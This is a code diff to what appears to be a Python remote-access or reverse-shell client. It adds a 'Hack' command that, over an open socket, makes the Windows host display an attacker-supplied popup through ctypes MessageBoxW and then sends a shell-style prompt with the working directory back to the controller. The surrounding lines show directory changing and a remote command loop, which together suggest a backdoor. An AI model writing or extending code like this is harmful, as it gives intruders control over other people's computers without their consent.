@@ -392,6 +392,21 @@ quit       - Close connection
                         s.send(info.encode() + os.getcwd().encode() + b"> ")
                         continue
                 
+                if cmd.startswith("Hack "):
+                    message = cmd[5:].strip()
+                    info = "=== Popup Message ===\n"
+                    try:
+                        if platform.system() == 'Windows':
+                            import ctypes
+                            ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0x40 | 0x1000)
+                            info += f"Popup displayed: {message}\n"
+                        else:
+                            info += "This command only works on Windows\n"
+                    except Exception as e:
+                        info += f"Error: {str(e)}\n"
+                    s.send(info.encode() + os.getcwd().encode() + b"> ")
+                    continue
+                
                 if data[:2].decode("utf-8") == 'cd':
                     try:
                         os.chdir(data[3:].decode("utf-8"))
